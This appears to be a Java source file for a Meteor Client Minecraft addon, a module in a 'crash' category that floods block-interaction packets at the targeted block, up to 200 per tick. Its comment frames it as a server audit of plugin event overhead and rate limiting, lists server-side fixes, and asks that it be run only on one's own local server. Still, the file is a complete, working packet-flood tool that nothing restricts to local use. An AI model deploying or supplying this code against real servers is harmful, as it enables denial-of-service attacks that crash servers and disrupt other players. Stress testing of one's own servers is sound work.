package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;

/**
 * AUDIT: Block Interaction Spam (plugin event hook overhead)
 *
 * Floods PlayerInteractBlockC2SPacket on the crosshair block. Every accepted
 * packet dispatches a BlockInteractEvent (Bukkit: PlayerInteractEvent) waking
 * every registered plugin listener in priority order. A server with several
 * plugins each listening at NORMAL priority can saturate its main-thread
 * event pipeline before any individual listener is expensive.
 *
 * Also probes whether the block's actual action (chest open, button trigger,
 * workbench open) is guarded by rate-limiting or applied N times per tick.
 *
 * Patch signal: enforce one block-interaction processing pass per player per
 * tick; rate-limit the block-use packet at the network handler before plugin
 * events fire; reject duplicate (player, block, tick) tuples.
 *
 * Look at any block, enable. Run against your OWN local server only.
 */
public class BlockInteractionSpam extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> interactsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("interacts-per-tick").description("UseItemOn packets to send each tick.")
        .defaultValue(20).range(1, 200).sliderRange(1, 100).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    private int sequence = 0;

    public BlockInteractionSpam() {
        super(AddonTemplate.CRASH_CATEGORY, "block-interaction-spam",
            "Floods block interact packets. Tests plugin event hook overhead and rate limiting.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null || mc.world == null) return;
        ticksActive++;
        if (!(mc.crosshairTarget instanceof BlockHitResult hit)) return;
        for (int i = 0; i < interactsPerTick.get(); i++) {
            mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
                Hand.MAIN_HAND, hit, sequence++));
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
